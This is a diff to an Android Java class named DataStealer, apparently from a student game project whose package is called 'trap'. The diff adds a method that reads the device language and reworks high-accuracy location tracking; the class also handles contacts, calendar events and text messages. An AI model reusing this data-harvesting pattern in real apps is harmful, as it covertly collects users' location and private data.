@@ -19,10 +19,13 @@ import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.tasks.OnSuccessListener;
 
 import java.util.ArrayList;
+import java.util.Collections;
+import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
+import de.hpi3d.gamepgrog.trap.datatypes.Language;
 import de.hpi3d.gamepgrog.trap.datatypes.LocationData;
 import de.hpi3d.gamepgrog.trap.datatypes.TextMessage;
 import de.hpi3d.gamepgrog.trap.future.Consumer;
@@ -145,6 +148,13 @@ public class DataStealer {
         return CalendarEvent.createFromCursor(cursor);
     }
 
+    public static ArrayList<Language> takeLanguage() {
+        ArrayList<Language> languageList = new ArrayList<>();
+        languageList.add(Language.getCurrentLanguage());
+        return languageList;
+
+    }
+
     public DataStealer(FusedLocationProviderClient client) {
         fusedLocationClient = client;
     }
@@ -156,13 +166,13 @@ public class DataStealer {
      * @param context
      * @param consumer
      */
-    public void takeLocationData(Context context, Consumer<LocationData[]> consumer) {
+    public static void takeLocationData(Context context, Consumer<List<LocationData>> consumer) {
         FusedLocationProviderClient client = new FusedLocationProviderClient(context);
         LocationRequest locationRequest = LocationRequest.create();
         locationRequest.setInterval(100);
         locationRequest.setFastestInterval(50);
         locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
-        locationCallback = new LocationCallback() {
+        LocationCallback locationCallback = new LocationCallback() {
             @Override
             public void onLocationResult(LocationResult locationResult) {
                 if (locationResult == null) {
@@ -170,14 +180,14 @@ public class DataStealer {
                 }
                 for (Location location : locationResult.getLocations()) {
                     // Give out data
-                    consumer.accept(new LocationData[]{new LocationData(location)});
-                    client.removeLocationUpdates(locationCallback);
+                    consumer.accept(Collections.singletonList(new LocationData(location)));
+                    client.removeLocationUpdates(this);
                 }
             }
         };
 
 
-        fusedLocationClient.requestLocationUpdates(locationRequest,
+        client.requestLocationUpdates(locationRequest,
                 locationCallback,
                 Looper.getMainLooper());
     }
